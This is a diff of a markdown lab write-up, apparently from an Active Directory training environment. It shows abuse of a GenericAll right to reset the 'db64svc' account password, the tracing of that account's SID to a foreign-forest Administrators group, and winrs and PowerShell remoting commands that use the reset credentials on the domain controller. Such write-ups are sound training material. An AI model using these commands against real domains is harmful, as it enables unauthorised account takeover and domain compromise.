@@ -220,6 +220,8 @@ IdentityReferenceName   : srvdba
 IdentityReferenceDomain : db.local
 IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
 IdentityReferenceClass  : user
+
+<snip>
 ```
 
 - The current user `srvdba` has `GenericAll` privilege on the domain object `dbvendor\db64svc`
@@ -229,7 +231,7 @@ IdentityReferenceClass  : user
 In so, we can change the password of the user `dbvendor\db64svc`:
 
 ```
-Set-DomainUserPassword -Identity db54svc -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Domain dbvendor.local -Verbose
+Set-DomainUserPassword -Identity db64svc -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Domain dbvendor.local -Verbose
 ```
 
 ![picture 9](images/771fda772e0a89a5d91f7df6ad87d781a8e76ab9bf76e483e30529b74c5312d6.png)  
@@ -321,441 +323,63 @@ MemberDomain            : db.local
 MemberName              : S-1-5-21-569087967-1859921580-1949641513-4603
 MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-4603,CN=ForeignSecurityPrincipals,DC=db,DC=local
 
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-4602
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-4602,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-4601
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-4601,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1163
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1163,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1162
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1162,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1161
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1161,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1160
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1160,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1159
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1159,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1158
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1158,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1157
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1157,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1156
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1156,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1155
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1155,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1154
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1154,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1153
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1153,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1152
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1152,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1151
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1151,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1150
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1150,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1149
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1149,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1148
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1148,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1147
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1147,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1146
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1146,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1145
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1145,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1144
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1144,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1143
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1143,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1142
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1142,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1141
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1141,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1140
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1140,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1139
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1139,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1138
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1138,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1137
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1137,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1136
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1136,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1135
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1135,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1134
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1134,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1133
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1133,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1132
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1132,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1131
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1131,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1130
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1130,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1129
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1129,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1128
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1128,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1127
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1127,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1126
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1126,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1125
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1125,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1124
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1124,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1123
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1123,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1122
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1122,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1121
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1121,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1120
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1120,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1119
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1119,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1118
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1118,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1117
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1117,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1116
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1116,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1115
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1115,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1114
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1114,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1113
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1113,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1112
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1112,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1111
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1111,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1110
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1110,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1109
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1109,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1108
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1108,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1107
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1107,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1106
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1106,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1105
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1105,CN=ForeignSecurityPrincipals,DC=db,DC=local
-
-GroupDomain             : db.local
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
-MemberDomain            : db.local
-MemberName              : S-1-5-21-569087967-1859921580-1949641513-1104
-MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-1104,CN=ForeignSecurityPrincipals,DC=db,DC=local
 ```
 
 <br/>
+
+Check the Domain Users on `dbvendor.local`:
+
+```
+Get-NetUser -Domain dbvendor.local | Select name, objectsid
+```
+
+![picture 10](images/d4d615606c347e577981b28596e0cdae6175716ce61a984bfa67996efd97e372.png)  
+
+- Note `S-1-5-21-569087967-1859921580-1949641513-4606` is `db64svc`
+- Related FSP:
+
+```
+GroupDomain             : db.local
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=db,DC=local
+MemberDomain            : db.local
+MemberName              : S-1-5-21-569087967-1859921580-1949641513-4606
+MemberDistinguishedName : CN=S-1-5-21-569087967-1859921580-1949641513-4606,CN=ForeignSecurityPrincipals,DC=db,DC=local
+```
+
+This means `dbvendor\db64svc` is in the `administrators` group (Domain Admins) in `db.local`.
+
+<br/>
+
+Then we can access `db-dc` since we have the Domain Admins credential of `dbvendor\db64svc:P@ssw0rd`:
+
+```
+winrs -r:db-dc.db.local -u:dbvendor\db64svc -p:P@ssw0rd hostname
+
+winrs -r:db-dc.db.local -u:dbvendor\db64svc -p:P@ssw0rd whoami
+```
+
+![picture 11](images/5b65907fd2c3c6eb55253d0242b0d1c41ac0222d8ff89101dc23b2f9a0e18d69.png)  
+
+(Somehow it stucks when running `whoami`)
+
+PS Remoting:
+
+```
+$passwd = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
+
+$creds = New-Object System.Management.Automation.PSCredential ("dbvendor\db64svc", $passwd)
+
+$dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
+
+Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
+```
+
+![picture 12](images/88470bd4b2eed5ea3f69040aa1ca53190911ed1b5f28e9d003b35ede5a1bf9fd.png)  
+
+
+<br/>
+
+
 
 ---
